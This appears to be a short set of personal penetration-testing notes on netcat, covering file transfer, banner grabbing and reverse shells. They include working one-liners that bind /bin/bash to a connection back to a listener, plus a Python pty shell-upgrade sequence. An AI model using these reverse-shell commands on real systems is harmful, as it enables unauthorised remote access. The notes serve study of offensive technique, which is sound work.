Doesn't support SSL. For that - `ncat`

### sending files
Listener:
`nc -lvp 4444 > incomig.txt` nc is a symlink of netcat  
TARGET HIGH PORTS  
Common users usually don't have access to ports under 1000  
`-l` - listening (opens port 4444 and pipe input into incoming.txt).  
`v` verbose `p` port 

Sender: 
`nc -vn 10.0.2.5 4444 < exploit.sh`  
`n` no DNS resolution  


### reverse shell 
Listener:
`nc -lvp 4444`

Target:  
`netcat 10.0.2.4 4444 -e /bin/bash` or `nc -c bash 10.0.0.1 4444`  
`-e` execute that program after connection -> that way you can send commends directly to opened shell via TCP connection (also possible with UDP `ncat --udp 10.0.0.1 4242 -e /bin/bash`)
remember that the **target** has to execute shell (same goes with bind shell)

Python tty (teletypewriter) wrapper:  
```bash
python-c 'import pty; pty.spawn("/bin/bash")'  
export TERM=xterm  
CTRL+Z  
stty raw -echo; fg  
```


### banner grabbing

`nc -vn 192.168.1.103 21`
